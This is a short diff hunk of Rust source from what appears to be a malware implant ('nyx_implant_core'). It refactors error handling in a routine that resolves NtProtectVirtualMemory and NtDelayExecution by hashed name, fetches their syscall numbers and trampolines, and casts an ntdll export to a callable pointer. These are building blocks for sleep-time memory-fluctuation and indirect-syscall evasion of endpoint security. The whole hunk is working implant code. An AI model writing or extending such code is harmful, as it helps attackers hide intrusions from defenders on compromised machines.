@@ -96,35 +96,20 @@ unsafe fn do_fluctuate_resolve() -> Option<(
     usize,
     usize,
 )> {
-    let rt = match nyx_implant_core::syscalls::global() {
-        Some(r) => r,
-        None => return None,
-    };
-    let region = match crate::sleep::own_text_region() {
-        Some(r) => r,
-        None => return None,
-    };
+    let rt = nyx_implant_core::syscalls::global()?;
+    let region = crate::sleep::own_text_region()?;
 
     let prot_hash = nyx_implant_core::resolve::djb2(b"ntprotectvirtualmemory");
     let delay_hash = nyx_implant_core::resolve::djb2(b"ntdelayexecution");
-    let prot_ssn = match rt.ssn_by_hash(prot_hash) {
-        Some(s) => s,
-        None => return None,
-    };
-    let delay_ssn = match rt.ssn_by_hash(delay_hash) {
-        Some(s) => s,
-        None => return None,
-    };
+    let prot_ssn = rt.ssn_by_hash(prot_hash)?;
+    let delay_ssn = rt.ssn_by_hash(delay_hash)?;
     let prot_tramp = rt.trampoline_for(prot_ssn) as usize;
     let delay_tramp = rt.trampoline_for(delay_ssn) as usize;
     if prot_tramp == 0 || delay_tramp == 0 {
         return None;
     }
 
-    let nt_alloc_va = match resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
-        Some(a) => a,
-        None => return None,
-    };
+    let nt_alloc_va = resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory")?;
     type NtAlloc =
         unsafe extern "system" fn(usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
     let alloc: NtAlloc = core::mem::transmute(nt_alloc_va);
